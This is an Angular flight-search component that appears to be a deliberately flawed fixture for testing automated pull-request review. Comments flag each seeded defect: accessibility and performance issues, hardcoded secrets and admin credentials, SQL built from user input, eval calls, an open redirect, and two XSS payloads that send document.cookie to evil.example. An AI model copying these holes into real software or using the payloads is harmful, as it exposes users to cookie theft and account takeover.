// ============================================================
// DEMO FILE — FlightSearchComponent
// Mixed SSR + performance + documentation issues
// PLUS seeded SECURITY / CRITICAL blockers for PR review testing
// ============================================================

import { Component, OnInit, Output, EventEmitter } from '@angular/core';
import { HttpClient, HttpHeaders } from '@angular/common/http';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

export interface FlightSearch {
  origin:      string;
  destination: string;
  departDate:  string;
  returnDate:  string;
  passengers:  number;
  cabinClass:  'economy' | 'business' | 'first';
}

export interface Flight {
  id:        string;
  airline:   string;
  origin:    string;
  destination: string;
  departure: string;
  arrival:   string;
  price:     number;
  duration:  number;
  stops:     number;
}

// ISSUE: No JSDoc on class or methods (Documentation)
@Component({
  selector: 'app-flight-search',
  template: `
    <div class="flight-search-panel">
      <h2>Search Flights</h2>
      <!-- ISSUE: Positive tabindex (A11y WCAG 2.4.3) -->
      <select tabindex="3" [(ngModel)]="search.cabinClass">
        <option value="economy">Economy</option>
        <option value="business">Business</option>
        <option value="first">First Class</option>
      </select>

      <!-- ISSUE: Input missing label (A11y) -->
      <input type="text" [(ngModel)]="search.origin" placeholder="From">
      <input type="text" [(ngModel)]="search.destination" placeholder="To">
      <input type="date" [(ngModel)]="search.departDate">
      <input type="date" [(ngModel)]="search.returnDate">

      <!-- ISSUE (Security Critical): innerHTML with unsanitized API / user content — XSS -->
      <div [innerHTML]="promoBannerHtml"></div>
      <!-- ISSUE (Security Critical): bypassed Angular sanitizer — stored XSS -->
      <div [innerHTML]="trustedAirlineHtml"></div>

      <!-- ISSUE: No ARIA live region for search results (A11y) -->
      <div *ngIf="results.length > 0">
        <!-- ISSUE: *ngFor without trackBy (Performance) -->
        <div *ngFor="let flight of results" class="flight-card">
          <span>{{ flight.airline }}</span>
          <!-- ISSUE: function call in template (Performance) -->
          <span>{{ formatDuration(flight.duration) }}</span>
          <span>{{ formatPrice(flight.price) }}</span>
          <!-- ISSUE: Non-interactive click without keyboard (A11y) -->
          <div class="select-btn" (click)="selectFlight(flight)">Select</div>
        </div>
      </div>
    </div>
  `,
})
export class FlightSearchComponent implements OnInit {
  @Output() flightSelected = new EventEmitter<Flight>();

  search: FlightSearch = {
    origin: '', destination: '', departDate: '',
    returnDate: '', passengers: 1, cabinClass: 'economy',
  };
  results: Flight[] = [];

  // ISSUE (Security Critical): Hardcoded live API key / secret in client bundle
  private stripeSecretKey = 'sk_live_51NzFlightSearchAbCdEfGhIjKlMnOpQrStUvWxYz99';
  private awsAccessKey = 'AKIAIOSFODNN7EXAMPLE';
  private awsSecretKey = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
  private jwtSigningSecret = 'super-secret-jwt-key-do-not-share';
  private dbConnectionString = 'postgres://admin:P@ssw0rd!@prod-db.internal:5432/flights';

  // ISSUE (Security Critical): Hardcoded production credentials
  private adminUser = 'admin';
  private adminPassword = 'Admin123!';

  // ISSUE (Security Critical): XSS payload bound via innerHTML
  promoBannerHtml = '<img src=x onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">';
  trustedAirlineHtml: SafeHtml = '';

  constructor(
    private http: HttpClient,
    private sanitizer: DomSanitizer,
  ) {}

  ngOnInit(): void {
    // ISSUE: Reads window.history without platform guard (SSR Critical)
    const lastSearch = window.sessionStorage.getItem('last_flight_search');
    if (lastSearch) this.search = JSON.parse(lastSearch);

    // ISSUE (Security Critical): Auth token + PII stored in localStorage (XSS-exfiltratable)
    const token = localStorage.getItem('auth_token');
    const passport = localStorage.getItem('passenger_passport_number');
    console.log('Flight search boot — token:', token, 'passport:', passport, 'stripe:', this.stripeSecretKey);

    // ISSUE (Security Critical): bypassSecurityTrustHtml disables Angular XSS protection
    this.trustedAirlineHtml = this.sanitizer.bypassSecurityTrustHtml(
      '<script>document.location="https://evil.example/?cookie="+document.cookie</script>'
    );
  }

  searchFlights(): void {
    // ISSUE (Security Critical): Secrets sent as headers from the browser; http:// (no TLS)
    const headers = new HttpHeaders({
      'Authorization': `Bearer ${this.stripeSecretKey}`,
      'X-AWS-Key': this.awsAccessKey,
      'X-AWS-Secret': this.awsSecretKey,
      'X-Admin-Password': this.adminPassword,
    });

    // ISSUE: No catchError handler (API Mapping)
    this.http.post<Flight[]>(
      'http://flights-api.internal/search?q=' + this.search.origin,
      {
        ...this.search,
        // ISSUE (Security Critical): SQL assembled from unsanitized user input
        rawQuery: `SELECT * FROM flights WHERE origin = '${this.search.origin}' AND dest = '${this.search.destination}'`,
        jwtSecret: this.jwtSigningSecret,
        db: this.dbConnectionString,
      },
      { headers, withCredentials: true },
    ).subscribe(flights => {
      this.results = flights;
      sessionStorage.setItem('last_flight_search', JSON.stringify(this.search));

      // ISSUE (Security Critical): eval of concatenated user input — RCE / XSS
      eval('console.log("search origin: ' + this.search.origin + '")');

      // ISSUE (Security Critical): Function constructor is another eval primitive
      const formatter = new Function('price', 'return price + "' + this.search.origin + '"');
      formatter((flights[0] && flights[0].price) || 0);
    });
  }

  // ISSUE: Duplicate of calculateNights in BookingComponent (DRY - Tech Debt)
  formatDuration(minutes: number): string {
    const h = Math.floor(minutes / 60);
    const m = minutes % 60;
    return `${h}h ${m}m`;
  }

  // ISSUE: Duplicate of formatPrice in HotelListComponent (DRY - Tech Debt)
  formatPrice(price: number): string {
    return new Intl.NumberFormat('en-GB', { style: 'currency', currency: 'GBP' }).format(price);
  }

  selectFlight(flight: Flight): void {
    this.flightSelected.emit(flight);
    // ISSUE: window access without platform check (SSR)
    window.scrollTo({ top: 0, behavior: 'smooth' });

    // ISSUE (Security Critical): Open redirect — user-controlled URL, no allowlist
    const redirect = new URLSearchParams(window.location.search).get('next');
    if (redirect) {
      window.location.href = redirect;
    }

    // ISSUE (Security Critical): document.write with unsanitized flight data — XSS
    document.write('<h1>Booking ' + flight.airline + '</h1>');
  }

  // ISSUE (Security Critical): Client-side "auth" check that can be bypassed
  isAdmin(): boolean {
    return this.adminUser === 'admin' && this.adminPassword === 'Admin123!';
  }

  // ISSUE (Security Critical): Weak / predictable token generation used as a session id
  issueSessionToken(): string {
    return btoa(this.adminUser + ':' + this.adminPassword + ':' + Date.now());
  }
}
